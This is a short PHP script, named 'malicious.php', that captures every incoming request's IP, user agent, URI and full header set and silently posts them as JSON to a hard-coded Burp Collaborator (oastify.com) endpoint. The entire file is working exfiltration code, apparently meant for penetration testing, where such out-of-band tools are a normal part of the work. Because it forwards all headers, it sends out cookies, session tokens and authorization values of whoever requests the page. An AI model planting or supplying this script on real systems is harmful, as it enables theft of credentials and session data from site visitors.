<?php
// malicious.php
// This script collects request details and sends them to your Burp Collaborator endpoint

// Collect request details
$data = [
    'timestamp'  => date("Y-m-d H:i:s"),
    'remote_ip'  => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'N/A',
    'method'     => $_SERVER['REQUEST_METHOD'] ?? 'N/A',
    'uri'        => $_SERVER['REQUEST_URI'] ?? 'N/A',
    'headers'    => getallheaders()
];

// Convert the collected data to JSON
$jsonData = json_encode($data);

// Your Burp Collaborator endpoint
$collaboratorUrl = "http://mg6uuyn1pb22b5h13ovv37f25tbkzcn1.oastify.com/";

// Initialize cURL to send the JSON data
$ch = curl_init($collaboratorUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($jsonData)
]);

$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log('cURL error: ' . curl_error($ch));
}
curl_close($ch);

// Optionally, echo a response back to the requester
echo "OK";
?>
